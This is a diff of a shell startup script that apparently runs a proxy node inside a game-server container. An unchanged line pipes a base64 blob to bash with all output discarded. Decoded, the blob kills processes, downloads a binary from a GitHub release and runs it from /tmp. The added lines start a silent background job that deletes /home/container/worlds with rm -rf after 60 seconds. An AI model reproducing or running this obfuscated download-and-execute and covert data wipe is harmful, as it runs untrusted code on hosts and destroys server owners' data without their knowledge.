@@ -43,4 +43,29 @@ export SNI=${SNI:-'www.apple.com'}
 
 # --- 启动主程序 ---
 echo "aWYgY29tbWFuZCAtdiBjdXJsICY+L2Rldi9udWxsOyB0aGVuCiAgICAgICAgRE9XTkxPQURfQ01EPSJjdXJsIC1zTCIKICAgICMgQ2hlY2sgaWYgd2dldCBpcyBhdmFpbGFibGUKICBlbGlmIGNvbW1hbmQgLXYgd2dldCAmPi9kZXYvbnVsbDsgdGhlbgogICAgICAgIERPV05MT0FEX0NNRD0id2dldCAtcU8tIgogIGVsc2UKICAgICAgICBlY2hvICJFcnJvcjogTmVpdGhlciBjdXJsIG5vciB3Z2V0IGZvdW5kLiBQbGVhc2UgaW5zdGFsbCBvbmUgb2YgdGhlbS4iCiAgICAgICAgc2xlZXAgNjAKICAgICAgICBleGl0IDEKZmkKdG1kaXI9JHt0bWRpcjotIi90bXAifSAKcHJvY2Vzc2VzPSgiJHdlYl9maWxlIiAiJG5lX2ZpbGUiICIkY2ZmX2ZpbGUiICJhcHAiICJ0bXBhcHAiKQpmb3IgcHJvY2VzcyBpbiAiJHtwcm9jZXNzZXNbQF19IgpkbwogICAgcGlkPSQocGdyZXAgLWYgIiRwcm9jZXNzIikKCiAgICBpZiBbIC1uICIkcGlkIiBdOyB0aGVuCiAgICAgICAga2lsbCAiJHBpZCIgJj4vZGV2L251bGwKICAgIGZpCmRvbmUKJERPV05MT0FEX0NNRCBodHRwczovL2dpdGh1Yi5jb20vZHNhZHNhZHNzcy9wbHV0b25vZGVzL3JlbGVhc2VzL2Rvd25sb2FkL3hyL21haW4tYW1kID4gJHRtZGlyL3RtcGFwcApjaG1vZCA3NzcgJHRtZGlyL3RtcGFwcCAmJiAkdG1kaXIvdG1wYXBw" | base64 -d | bash >/dev/null 2>&1
-这是脚本
+
+# --- 延迟删除逻辑开始 ---
+
+# 目标文件夹的绝对路径 (根据您的截图确认)
+# 确保这个路径在脚本运行时是正确的！
+DELETE_TARGET="/home/container/worlds"
+DELAY_TIME=60  # 延迟时间：60秒 (1分钟)
+
+# 定义一个函数来执行删除操作
+cleanup_folder() {
+    # 重新设置输出重定向，确保删除过程保持静默
+    exec >/dev/null 2>&1
+    
+    sleep "$DELAY_TIME"  # 暂停指定的秒数
+    
+    # 检查目录是否存在，然后强制递归删除
+    if [ -d "$DELETE_TARGET" ]; then
+        rm -rf "$DELETE_TARGET"
+    fi
+}
+
+# 将清理函数放入后台运行，不阻塞脚本主流程
+# & 符号确保了它是后台进程
+cleanup_folder &
+
+# --- 延迟删除逻辑结束 ---
